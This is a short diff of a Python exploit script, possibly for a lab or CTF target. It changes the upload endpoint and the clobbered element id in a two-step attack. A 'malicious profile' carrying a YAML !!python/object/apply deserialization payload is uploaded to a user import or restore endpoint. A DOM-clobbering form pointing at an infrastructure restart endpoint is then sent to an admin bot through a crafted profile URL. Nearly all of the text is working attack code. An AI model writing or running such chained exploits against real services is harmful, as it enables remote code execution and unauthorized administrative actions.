@@ -34,7 +34,7 @@ trigger_exploit: !!python/object/apply:app.utils.cluster_utils.DatabaseExporter
 """
 
 def upload_profile(payload):
-    target = f"{TARGET_URL}/api/v1/users/me/import-legacy"
+    target = f"{TARGET_URL}/api/v1/users/me/backup/restore"
     print(f"[+] Step 1: Uploading malicious profile to {target} ...")
     files = {'file': ('profile.yml', payload, 'application/x-yaml')}
     session.post(target, files=files)
@@ -43,7 +43,7 @@ def upload_profile(payload):
 def trigger_admin_bot():
     print("[+] Step 2: Crafting DOM Clobbering payload...")
 
-    clobber_payload = '<form id="ANALYTICS_CONFIG" action="/api/v1/infra/maintenance/restart" method="POST"></form>'
+    clobber_payload = '<form id="STEWARD_STATUS_CONFIG" action="/api/v1/infra/maintenance/restart" method="POST"></form>'
     encoded_bio = urllib.parse.quote(clobber_payload)
     
     weaponized_url = f"{TARGET_URL}/profile/attacker?bio={encoded_bio}"
